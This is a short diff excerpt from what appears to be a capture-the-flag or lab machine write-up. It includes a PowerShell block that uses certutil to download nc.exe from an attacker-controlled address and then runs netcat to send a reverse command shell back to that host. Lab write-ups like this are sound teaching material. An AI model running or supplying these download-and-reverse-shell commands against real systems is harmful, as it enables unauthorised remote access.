@@ -63,7 +63,7 @@ The weird one useness of this technique:
 ![](itseemitgetoneuse.png)
 
 Sometimes I could chain commands other times I had to reupload, but as I am very aware the OPSec on this box no my part was like a rhino riding tank playing loud dance music while calling down  orbital laser bombardment to "learn".
-
+[]￼￼￼￼￼￼￼
 ```powershell
 certutil -urlcache -split -f http://10.10.14.8/nc.exe c:\programdata\nc.exe
 c:\programdata\nc.exe 10.10.14.8 8443 -e cmd
